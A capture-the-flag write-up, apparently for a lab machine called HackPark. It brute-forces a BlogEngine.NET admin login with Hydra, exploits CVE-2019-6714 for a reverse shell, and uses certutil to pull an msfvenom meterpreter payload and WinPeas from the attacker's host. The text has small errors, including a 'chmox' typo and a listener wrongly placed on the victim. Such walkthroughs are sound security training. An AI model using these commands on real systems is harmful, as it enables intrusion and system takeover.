### Nmap Scan
**Enumerate open ports and their versions to find the vulnerability.**
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 15:25 EDT
Nmap scan report for 10.10.101.155
Host is up (0.022s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: hackpark | hackpark amusements
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-05-18T19:27:44+00:00
|_ssl-date: 2025-05-18T19:27:49+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2025-05-17T19:13:48
|_Not valid after:  2025-11-16T19:13:48
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   22.11 ms 10.14.0.1
2   22.41 ms 10.10.101.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.75 seconds
```

### BurpSuite
- Open `burpsuite`
- Login to the website with the username `admin` (provided)
- The login form is making a `POST` request.
- The next step is to brute force the login page with hydra, but before that we need to find the `__VIEWSTATE` and `__EVENTVALIDATION` because the website is using the `.aspx` form:
	- **ASP.NET Forms**: These forms usually use ***anti-CSRF*** mechanisms like `__VIEWSTATE` and `__EVENTVALIDATION`, and similar ***dynamic hidden fields***. These ***tokens change with each request and are required to be valid for login***. Hydra, in its default mode, sends the same ***static request for every password attempt***, so it doesn't update the tokens each time.

### Hydra
**Brute force the login page with the username `admin`**
```bash
hydra -l <username> -P <password list> $ip -V http-form-post '/login.aspx?ReturnURL=/admin:__VIEWSTATE=UrqWb2RL8KZfJ91A8QYxfD60ktVv6Py1u2d6mDtcZHGE8QDoKbcA%2FsOAO3AJ6V0Cykk7WUn2FfjxH0xcS6N8IU3dK006iPXo5BH2GeElwUQpPK%2FwxfTRmJ5UbZVzX8FhKS02Db8PEfnMZpVb6np3Wf5girU2sucKJC7R%2F2CykMXeKHWC&__EVENTVALIDATION=ylQOemUDKmktcu7LCTC93iTRqzy9s80fHyH2tfu2UXas4EaglWlzYacvQluQAQflrDZm8DttbbGtEFHIIjLybaLlEsthWfdHBkVRwBkPR1rYEG2qUeVQGlziLsVcnCrimV3itOOd4DdCIUYjBj9sbZy1GEmKxy06rydTPGIGzXxVssTX&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed'
```

- Password found: **`1qaz2wsx`**

### Login to the Website
- **`admin:1qaz2wsx`**
- Check the version of the `BlogEngine: 3.3.6.0`

### Use exploit database to find an exploit 
```bash
searchsploit blogengine.net
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                   | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                         | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                        | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                        | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                   | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                   | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                | aspx/webapps/47014.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**Download the exploit**
```bash
searchsploit -m 46353.cs
```

**Find the CVE**
```bash
cat PostView.ascx        
# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714
```

### Follow the instructions within the file to gain initial access to the server
**Change the IP**
```bash
vim 46353.cs
```

- Once the IP is changed, save the file as `PostView.ascx`.
- Upload the file to this location `http://IP/admin/app/editor/editpost.cshtml` through file manager. This is under the icon that looks like an open file in the toolbar.

**Setup a nc listener**
```bash
nc -nvlp 4445
```

- Now, perform the directory traversal `http://10.10.10.10/?theme=../../App_Data/files`
- You should receive a reverse shell as `iis apppool\blog`.

### Perform Privilege Escalation
Our netcat shell is unstable, so to get it stable we need to generate another reverse shell with `msfvenom`. Before that, check the ****architecture**** of the OS (`x64`).
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<KALI_IP> lport=<1111> -f exe -o shell.exe
```

**make the payload executable**
```bash
chmox +x shell.exe
```

Now, we need to transfer the file over to the victim machine. In your kali machine where the payload is located, start the http listener.
```bash
python3 -m http.server
```

It's always the best idea to transfer the file to the `Temp` folder in Windows. We will use the `certutil` tool to transfer the file (PowerShell can be used as well).
```cmd
cd c:\Windows\Temp
certutil -urlcache -split -f http://<kali_ip>:8000/shell.exe
```

On the victim's machine we need to start the Metasploit listener because nc listener is basic and can't handle the meterpreter shell.
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <kali_ip>
set lport 1111
run
```

Now, run the payload
```
shell.exe
```

You should now receive a meterpreter shell. The next step is to transfer the `WinPeas.exe` script to the victim's machine.
```bash
python3 -m http.server
```

```cmd
certutil -urlcache -split -f http://<kali_ip>:8000/WinPeas.exe
```

Now, run the `WinPeas.exe` script
```cmd
WinPeas.exe
```


### Identify the Service
```
wmic 
```
